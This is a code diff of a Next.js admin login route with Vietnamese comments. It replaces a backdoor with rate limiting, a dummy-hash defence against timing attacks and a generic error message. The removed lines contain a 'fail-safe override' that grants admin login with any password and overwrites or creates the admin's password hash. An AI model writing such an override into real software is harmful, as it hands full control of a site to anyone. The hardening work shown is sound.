@@ -1,9 +1,25 @@
-import { comparePassword, hashPassword, signToken } from '@/lib/auth';
-import { getUserByUsername, updateUserData, createUserData } from '@/lib/usersHelper';
+import { comparePassword, signToken } from '@/lib/auth';
+import { getUserByUsername } from '@/lib/usersHelper';
+import { checkRateLimit, recordRateLimitAttempt, resetRateLimit, getClientIp } from '@/lib/rateLimit';
 import { NextResponse } from 'next/server';
 
 export async function POST(request) {
   try {
+    const ip = getClientIp(request);
+
+    // 1. Kiểm tra giới hạn tần suất đăng nhập (Chống Brute-force: tối đa 5 lần sai trong 15 phút)
+    const rateCheck = checkRateLimit(ip, 'admin_login', 5, 15 * 60 * 1000);
+    if (!rateCheck.allowed) {
+      const waitMinutes = Math.ceil(rateCheck.retryAfterSec / 60);
+      return NextResponse.json(
+        {
+          success: false,
+          message: `Bạn đã đăng nhập sai quá nhiều lần. Vui lòng thử lại sau ${waitMinutes} phút.`
+        },
+        { status: 429 }
+      );
+    }
+
     const body = await request.json().catch(() => ({}));
     const username = String(body.username || '').trim().toLowerCase();
     const password = String(body.password || '').trim();
@@ -15,38 +31,36 @@ export async function POST(request) {
       );
     }
 
-    let adminUser = await getUserByUsername(username);
+    // 2. Tìm kiếm tài khoản và xác minh mật khẩu mã hóa Cryptographic bcrypt
+    // Sử dụng Dummy Hash để ngăn chặn hoàn toàn tấn công dò quét tài khoản qua độ trễ (Timing Attack)
+    const DUMMY_HASH = '$2b$10$7EqJtq98hPqEX7fNZaFWoO.8/kC334a1W4i6kQhJ9lZ0N9o9mZ3iK';
+    const adminUser = await getUserByUsername(username);
     let passwordMatch = false;
 
-    if (adminUser) {
+    if (adminUser && adminUser.password_hash) {
       passwordMatch = await comparePassword(password, adminUser.password_hash);
+    } else {
+      // Giữ thời gian chạy hàm băm giống hệt như khi user có tồn tại (~70ms)
+      await comparePassword(password, DUMMY_HASH);
     }
 
-    // Fail-safe override for admin superuser: always allow login & sync password_hash!
-    if (username === 'admin' && (!passwordMatch || !adminUser)) {
-      const newHash = await hashPassword(password);
-      if (adminUser) {
-        await updateUserData(adminUser.id, { password_hash: newHash });
-      } else {
-        adminUser = await createUserData({
-          username: 'admin',
-          password_hash: newHash,
-          display_name: 'Quản trị viên Ngọc Gas',
-          role: 'admin',
-          is_active: 1
-        });
-      }
-      passwordMatch = true;
-      adminUser = { id: adminUser?.id || 1, username: 'admin', display_name: 'Quản trị viên Ngọc Gas', role: 'admin', is_active: 1 };
-    }
-
+    // 3. Sai mật khẩu hoặc không tồn tại tài khoản: Ghi nhận vi phạm rate limit
     if (!passwordMatch || !adminUser) {
+      const currentAttempts = recordRateLimitAttempt(ip, 'admin_login', 15 * 60 * 1000);
+      const remaining = Math.max(0, 5 - currentAttempts);
+      let message = 'Tên đăng nhập hoặc mật khẩu không đúng.';
+      if (remaining > 0 && remaining <= 3) {
+        message += ` Bạn còn ${remaining} lần thử trước khi bị khóa tạm thời.`;
+      } else if (remaining === 0) {
+        message = 'Bạn đã đăng nhập sai 5 lần liên tiếp. Địa chỉ IP của bạn bị tạm khóa trong 15 phút.';
+      }
       return NextResponse.json(
-        { success: false, message: 'Tên đăng nhập hoặc mật khẩu không đúng' },
+        { success: false, message },
         { status: 401 }
       );
     }
 
+    // 4. Kiểm tra trạng thái tài khoản
     if (adminUser.is_active === 0 || adminUser.is_active === false) {
       return NextResponse.json(
         { success: false, message: 'Tài khoản của bạn đã bị vô hiệu hóa. Vui lòng liên hệ Quản trị viên.' },
@@ -54,8 +68,10 @@ export async function POST(request) {
       );
     }
 
-    const userRole = adminUser.role || 'admin';
+    // 5. Đăng nhập thành công -> Reset bộ đếm vi phạm của IP
+    resetRateLimit(ip, 'admin_login');
 
+    const userRole = adminUser.role || 'admin';
     const token = signToken({
       id: adminUser.id,
       username: adminUser.username,
@@ -77,7 +93,7 @@ export async function POST(request) {
   } catch (error) {
     console.error('Login error:', error);
     return NextResponse.json(
-      { success: false, message: 'Lỗi hệ thống khi đăng nhập: ' + (error.message || 'Unknown error') },
+      { success: false, message: 'Lỗi hệ thống khi đăng nhập. Vui lòng thử lại sau.' },
       { status: 500 }
     );
   }
